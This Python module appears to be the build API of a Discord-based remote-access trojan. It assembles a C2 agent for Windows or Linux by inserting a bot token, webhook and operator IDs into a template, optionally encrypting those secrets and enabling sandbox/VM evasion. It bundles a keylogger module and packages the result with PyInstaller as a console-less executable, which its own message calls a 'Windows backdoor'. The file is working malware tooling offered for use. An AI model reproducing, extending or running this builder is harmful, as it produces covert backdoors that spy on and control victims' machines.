# -*- coding: utf-8 -*-
"""Shared Discord agent build API (Windows + Linux).

Used by builder.py (interactive REPL and --env/--batch).
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Optional

ROOT = Path(__file__).resolve().parent.parent

try:
    import distro  # type: ignore
except ImportError:  # optional on some hosts
    distro = None


def format_operator_ids(raw: str) -> str:
    """Return Python set-literal body for OPERATOR_IDS, e.g. '{123, 456}'."""
    parts = [p.strip() for p in str(raw).replace(";", ",").split(",") if p.strip()]
    ids = []
    for p in parts:
        if not p.isdigit():
            raise ValueError(f"operator id must be numeric, got {p!r}")
        ids.append(p)
    if not ids:
        raise ValueError("operator-ids required (fail-closed)")
    return "{" + ", ".join(ids) + "}"


def apply_common_replacements(source: str, evasion: str) -> str:
    flag = "True" if str(evasion).lower() in ("true", "1", "yes", "on") else "False"
    source = source.replace("{EVASION}", flag)
    if "sandboxevasion.test()" in source:
        if flag == "False":
            source = source.replace(
                "if sandboxevasion.test() == True and disctopia.isVM() == False:",
                "if True:  # evasion disabled by builder",
            )
    return source


def _wine_pyinstaller() -> str:
    candidates = [
        os.path.expanduser(
            "~/.wine/drive_c/users/root/Local Settings/Application Data/"
            "Programs/Python/Python38-32/Scripts/pyinstaller.exe"
        ),
        os.path.expanduser(
            "~/.wine/drive_c/users/root/AppData/Local/Programs/"
            "Python/Python38-32/Scripts/pyinstaller.exe"
        ),
    ]
    if distro is not None:
        try:
            name = distro.name()
        except Exception:
            name = ""
        if "Arch" in name or "Manjaro" in name:
            candidates.insert(0, candidates[0])
    for path in candidates:
        if os.path.exists(path):
            return path
    return candidates[-1]


def _inject_discord_source(
    *,
    template: str,
    guild: str,
    token: str,
    channel: str,
    webhook: str,
    operator_ids_literal: str,
    evasion: str,
    obfuscate: bool,
) -> tuple[str, Optional[str]]:
    """Return (agent_source, secretbox_source_or_None)."""
    source = apply_common_replacements(template, evasion)
    source = source.replace("{OPERATOR_IDS}", operator_ids_literal)

    if not obfuscate:
        print(
            "\n[!] WARNING: obfuscate=false — Discord secrets will be PLAINTEXT "
            "in the packaged agent (debug only).\n"
            "[!] Anyone with the file can steal the bot token / webhook.\n"
        )
        source = source.replace("{GUILD_EXPR}", str(guild))
        source = source.replace("{CHANNEL_EXPR}", str(channel))
        source = source.replace("{WEBHOOK_EXPR}", repr(str(webhook)))
        source = source.replace("{TOKEN_EXPR}", repr(str(token)))
        # Drop unused import when plaintext mode skips secretbox.
        source = source.replace("from libraries import secretbox\n", "")
        source = source.replace("from libraries import secretbox as secretbox\n", "")
        return source, None

    # Fail closed if obfuscation tooling cannot load cryptography.
    from libraries.obfuscate_build import (  # local import after path setup
        assert_no_plaintext,
        encrypt_secrets,
    )

    blobs, _mat, secretbox_src = encrypt_secrets(
        {
            "guild": str(guild),
            "channel": str(channel),
            "webhook": str(webhook),
            "token": str(token),
        }
    )
    source = source.replace(
        "{GUILD_EXPR}", f'int(secretbox.unlock("{blobs["guild"]}"))'
    )
    source = source.replace(
        "{CHANNEL_EXPR}", f'int(secretbox.unlock("{blobs["channel"]}"))'
    )
    source = source.replace(
        "{WEBHOOK_EXPR}", f'secretbox.unlock("{blobs["webhook"]}")'
    )
    source = source.replace(
        "{TOKEN_EXPR}", f'secretbox.unlock("{blobs["token"]}")'
    )
    assert_no_plaintext(
        source, [token, webhook, str(guild), str(channel)], label="agent source"
    )
    if "{TOKEN_EXPR}" in source or "{GUILD_EXPR}" in source:
        raise SystemExit("[!] template placeholders not fully replaced")
    return source, secretbox_src


def resolve_linux_pack(pack: str) -> str:
    pack = (pack or "auto").lower()
    if pack == "auto":
        return "script"
    if pack in ("script", "onefile"):
        return pack
    if pack == "exe":
        print("[!] pack=exe is Windows-only; using script for Linux")
        return "script"
    print(f"[!] Unknown pack={pack}; using script")
    return "script"


def build_linux_script(source: str, name: str, secretbox_src: Optional[str]) -> Path:
    out_dir = ROOT / "dist" / f"{name}-linux"
    if out_dir.is_dir():
        shutil.rmtree(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)
    lib_dst = out_dir / "libraries"
    lib_dst.mkdir(parents=True, exist_ok=True)

    for fname in ("__init__.py", "linuxops.py", "keylogger_linux.py"):
        src = ROOT / "libraries" / fname
        if not src.exists():
            raise FileNotFoundError(f"missing {src}")
        shutil.copy2(src, lib_dst / fname)

    if secretbox_src is not None:
        (lib_dst / "secretbox.py").write_text(secretbox_src, encoding="utf-8")
    else:
        # Plaintext debug builds may omit secretbox; keep package import-safe.
        (lib_dst / "secretbox.py").write_text(
            'raise SystemExit("secretbox unused (obfuscate=false)")\n',
            encoding="utf-8",
        )

    agent_path = out_dir / "agent.py"
    agent_path.write_text(source, encoding="utf-8")

    req_lines = [
        "discord.py>=2.7.0",
        "requests>=2.33.0",
        "psutil>=6.0.0",
        "urllib3>=2.8.0",
        "evdev>=1.6.0",
    ]
    if secretbox_src is not None:
        req_lines.append("cryptography>=50.0.0")
    req_lines.extend(
        [
            "# optional GUI screenshot support:",
            "# mss",
            "# pillow",
            "",
        ]
    )
    (out_dir / "requirements.txt").write_text("\n".join(req_lines), encoding="utf-8")

    run_sh = """#!/usr/bin/env bash
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"
PYTHON="${PYTHON:-python3}"
if [[ ! -d .venv ]]; then
  "$PYTHON" -m venv .venv
  .venv/bin/pip install -U pip wheel
  .venv/bin/pip install -r requirements.txt
fi
exec .venv/bin/python agent.py
"""
    run_path = out_dir / "run.sh"
    run_path.write_text(run_sh, encoding="utf-8")
    run_path.chmod(0o755)
    print(f'\n[+] Linux script package: {out_dir}/')
    print("[+] On target: bash run.sh   (or: pip install -r requirements.txt && python3 agent.py)")
    return out_dir


def build_linux_onefile(source: str, name: str, secretbox_src: Optional[str]) -> Path:
    staging_dir = ROOT / "build" / "linux-src"
    staging_dir.mkdir(parents=True, exist_ok=True)
    # Stage a mini package so PyInstaller can collect libraries.secretbox
    lib_stage = staging_dir / "libraries"
    if lib_stage.exists():
        shutil.rmtree(lib_stage)
    lib_stage.mkdir(parents=True)
    for fname in ("__init__.py", "linuxops.py", "keylogger_linux.py"):
        shutil.copy2(ROOT / "libraries" / fname, lib_stage / fname)
    if secretbox_src is not None:
        (lib_stage / "secretbox.py").write_text(secretbox_src, encoding="utf-8")

    staging = staging_dir / f"{name}-linux-src.py"
    staging.write_text(source, encoding="utf-8")

    venv_pyinstaller = ROOT / ".venv" / "bin" / "pyinstaller"
    venv_pip = ROOT / ".venv" / "bin" / "pip"
    if not venv_pyinstaller.exists():
        print("[*] Installing native PyInstaller into builder venv...")
        subprocess.check_call(
            [str(venv_pip), "install", "pyinstaller", "discord.py", "requests", "psutil", "cryptography"]
        )
    subprocess.check_call(
        [str(venv_pip), "install", "-q", "discord.py", "requests", "psutil", "cryptography"]
    )

    dist_dir = ROOT / "dist"
    dist_dir.mkdir(exist_ok=True)
    cmd = [
        str(venv_pyinstaller),
        "--onefile",
        "--name",
        name,
        "--distpath",
        str(dist_dir),
        "--workpath",
        str(ROOT / "build" / "linux"),
        "--specpath",
        str(ROOT / "build" / "linux"),
        "--paths",
        str(staging_dir),
        "--hidden-import",
        "libraries.linuxops",
        "--hidden-import",
        "libraries.keylogger_linux",
        "--hidden-import",
        "libraries.secretbox",
        "--hidden-import",
        "cryptography",
        "--collect-all",
        "discord",
        "--collect-all",
        "cryptography",
        str(staging),
    ]
    # Run from staging_dir so `libraries` resolves.
    rc = subprocess.call(cmd, cwd=str(staging_dir))
    try:
        staging.unlink()
    except FileNotFoundError:
        pass
    if rc != 0:
        print("[!] PyInstaller failed — falling back to script package")
        return build_linux_script(source, name, secretbox_src)
    print(f"\n[+] Linux onefile binary: dist/{name}")
    return dist_dir / name


def build_windows(source: str, name: str, secretbox_src: Optional[str]) -> Path:
    work = ROOT / "build" / "windows-src"
    work.mkdir(parents=True, exist_ok=True)
    lib_dst = work / "libraries"
    if lib_dst.exists():
        shutil.rmtree(lib_dst)
    # Copy full libraries tree used by Windows agent + secretbox
    shutil.copytree(
        ROOT / "libraries",
        lib_dst,
        ignore=shutil.ignore_patterns("__pycache__", "obfuscate_build.py", "build_api.py"),
    )
    if secretbox_src is not None:
        (lib_dst / "secretbox.py").write_text(secretbox_src, encoding="utf-8")

    agent_py = work / f"{name}.py"
    agent_py.write_text(source, encoding="utf-8")

    path_to_pyinstaller = _wine_pyinstaller()
    compile_command = [
        "wine",
        path_to_pyinstaller,
        "--onefile",
        "--noconsole",
        "--icon=img/exe_file.ico",
        "--paths",
        str(work),
        "--hidden-import",
        "libraries.secretbox",
        "--hidden-import",
        "cryptography",
        str(agent_py),
    ]
    # Prefer running from repo root so img/ paths resolve.
    subprocess.call(compile_command, cwd=str(ROOT))
    for leftover in (ROOT / f"{name}.py", ROOT / f"{name}.spec"):
        try:
            leftover.unlink()
        except FileNotFoundError:
            pass
    print('\n[+] Windows backdoor is inside the "dist" directory')
    return ROOT / "dist" / f"{name}.exe"


def build_discord_agent(
    *,
    name: str,
    target: str,
    pack: str = "auto",
    evasion: str = "false",
    guild: str,
    token: str,
    channel: str,
    webhook: str = "None",
    operator_ids: str,
    obfuscate: bool = True,
) -> Path:
    """Build a Discord C2 agent for windows|linux. Returns output path."""
    os.chdir(ROOT)
    if str(ROOT) not in sys.path:
        sys.path.insert(0, str(ROOT))

    if not name or name == "None":
        raise ValueError("name required")
    target = target.lower()
    if target not in ("windows", "linux"):
        raise ValueError("target must be windows|linux")

    ops_literal = format_operator_ids(operator_ids)

    if target == "linux":
        src_path = ROOT / "code" / "discord" / "main_linux.py"
    else:
        src_path = ROOT / "code" / "discord" / "main.py"
    template = src_path.read_text(encoding="utf-8")

    source, secretbox_src = _inject_discord_source(
        template=template,
        guild=guild,
        token=token,
        channel=channel,
        webhook=webhook,
        operator_ids_literal=ops_literal,
        evasion=evasion,
        obfuscate=obfuscate,
    )

    if target == "linux":
        mode = resolve_linux_pack(pack)
        if mode == "onefile":
            return build_linux_onefile(source, name, secretbox_src)
        return build_linux_script(source, name, secretbox_src)
    return build_windows(source, name, secretbox_src)
